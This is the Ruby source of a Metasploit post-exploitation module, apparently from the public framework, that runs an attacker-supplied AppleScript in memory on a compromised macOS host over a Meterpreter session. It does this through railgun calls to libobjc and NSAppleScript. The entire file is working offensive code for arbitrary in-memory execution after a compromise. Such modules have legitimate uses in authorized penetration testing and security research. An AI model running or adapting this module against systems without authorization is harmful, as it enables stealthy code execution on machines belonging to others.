##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  # https://developer.apple.com/documentation/foundation/1497293-anonymous/nsutf8stringencoding?language=objc
  NSUTF8StringEncoding = 4
  def initialize(info={})
    super( update_info( info,
      'Name'          => "OS X Apple Script",
      'Description'   => %q{
        This module will execute an apple script in memory.
      },
      'References'    => [ ],
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Spencer McIntyre'],
      'Platform'      => [ 'osx' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

  register_options(
    [
      OptPath.new('SCRIPT',  [true, 'The apple script to execute', nil])
    ])
  end

  def new_nsstring(string)
    libobjc = session.railgun.libobjc
    cls_nsstring = libobjc.objc_getClass('NSString')['return']
    return nil if cls_nsstring == 0
    sel_alloc = libobjc.sel_registerName('alloc')['return']
    return nil if sel_alloc == 0

    nsstring = libobjc.objc_msgSend(cls_nsstring, sel_alloc)['return']
    return nil if nsstring == 0

    sel_init = libobjc.sel_registerName('initWithCString:encoding:')['return']
    return nil if sel_init == 0

    msg_send = Rex::Post::Meterpreter::Extensions::Stdapi::Railgun::DLLFunction.new(
      'LPVOID',
      [
        ['LPVOID', 'self', 'in'],
        ['LPVOID', 'op', 'in'],
        ['PCHAR', 'param1', 'in'],
        ['DWORD', 'param2', 'in']
      ],
      'objc_msgSend',
      'cdecl'
    )
    nsstring = session.railgun.dlls['libobjc'].call_function(
      msg_send, [nsstring, sel_init, string, NSUTF8StringEncoding],
      session
    )['return']
    return nil if nsstring == 0

    nsstring
  end

  def run
    rg = session.railgun
    result = rg.libc.dlopen('/System/Library/Frameworks/Foundation.framework/Foundation', 'RTLD_LAZY | RTLD_GLOBAL')
    fail_with(Failure::Unknown, 'failed to load Foundation.framework') if result['return'] == 0

    script = ::File.open(datastore['SCRIPT'], 'rb') { |fd| script = fd.read }
    script = new_nsstring(script)
    fail_with(Failure::Unknown, 'failed to initialize the script as an NSString') if script.nil?
    vprint_status('Allocated and initialized an NSString instance')

    cls_nsapplescript = rg.libobjc.objc_getClass('NSAppleScript')['return']
    fail_with(Failure::Unknown, 'failed to get class NSAppleScript') if cls_nsapplescript == 0

    sel_alloc = rg.libobjc.sel_registerName('alloc')['return']
    fail_with(Failure::Unknown, 'failed to get alloc selector') if sel_alloc == 0

    nsapplescript = rg.libobjc.objc_msgSend(cls_nsapplescript, sel_alloc)['return']
    fail_with(Failure::Unknown, 'failed to allocate a new NSAppleScript object') if nsapplescript == 0
    msg_send = Rex::Post::Meterpreter::Extensions::Stdapi::Railgun::DLLFunction.new(
      'LPVOID',
      [
        ['LPVOID', 'self', 'in'],
        ['LPVOID', 'op', 'in'],
        ['LPVOID', 'param1', 'in']
      ],
      'objc_msgSend',
      'cdecl'
    )
    nsapplescript = rg.dlls['libobjc'].call_function(
      msg_send, [nsapplescript, rg.libobjc.sel_registerName('initWithSource:')['return'], script],
      session
    )['return']
    fail_with(Failure::Unknown, 'failed to initialize an NSAppleScript instance') if nsapplescript == 0
    vprint_status('Allocated and initialized an NSAppleScript instance')

    sel_execute = rg.libobjc.sel_registerName('executeAndReturnError:')['return']
    fail_with(Failure::Unknown, 'failed to get executeAndReturnError selector') if sel_execute == 0

    print_status('Now executing the apple script')
    result = rg.libobjc.objc_msgSend(nsapplescript, sel_execute)
  end

end
